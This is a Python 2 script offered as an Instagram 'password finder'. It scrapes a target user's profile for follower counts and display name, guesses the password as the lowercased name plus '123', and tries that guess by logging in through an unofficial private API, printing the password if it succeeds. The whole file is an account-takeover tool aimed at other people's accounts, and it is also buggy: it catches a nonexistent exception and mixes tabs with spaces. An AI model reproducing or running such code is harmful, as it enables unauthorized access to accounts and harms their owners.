import urllib2, os, json, sys, random
from bs4 import BeautifulSoup
try:
    from instagram_private_api import Client, ClientCompatPatch
except ModuleImportError:
    os.system('pip2 install git+https://git@github.com/ping/instagram_private_api.git@1.6.0')
from time import sleep

username=raw_input('username> ')

def userinfo(func):
    def getuser_followers():
        try:
            url='https://www.instagram.com/%s' % (username)
            r=urllib2.Request(url)
            g=urllib2.urlopen(r)
        except:
            pass
        try:
            b=BeautifulSoup(g.read(), 'html.parser')
        except UnboundLocalError:
            print 'user not found'
            sys.exit(True)  
        f=b.find('meta', property="og:description")
        d=f['content'].split("-")[0].split()
        sleep(2)
        print '\t\nUSER ' + username + ' FOUND!\n'
        print '\t',d[0],'Followers'
        print '\t',d[2],'Followings'
        print '\t',d[4],'Posts\n'
    return getuser_followers
    
@userinfo
def get_info():	return
def userpass():

	url='https://www.instagram.com/%s' % (username)
	r=urllib2.Request(url)
	g=urllib2.urlopen(r)
	b=BeautifulSoup(g.read(), 'html.parser')
	f=b.find('script', type="application/ld+json")
	d=f.contents[0].split('\s+')[0]
	jj=d.decode("utf-8")
	j=json.loads(jj)
	data=j['name'].lower()
	rp=data.replace(' ','')
	out=open('data','w')
	out.write(rp +'123')
	out.close()

def loads(s):
    for x in s + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        sleep(random.random()* 0.3)

def instagram(func):
	def instagram_login():
		try:
			passwd=open('data','r').read()
		except IOError as err:
			return err

		try:
			delay=2
			a=Client(username,passwd)
			r=a.feed_timeline()
			loads('Finding Password ...')
			sleep(delay * 7)
		except:
			loads('Finding Password ...')
			sleep(delay*7)
			print 'Password not found! Try again'
		else:
            
			print '\nlogin as',username,'successfully'
			print 'Password =>',passwd
	return instagram_login

@instagram
def crack():	return
if __name__=='__main__':
	# tamplate
    get_info();userpass();crack()
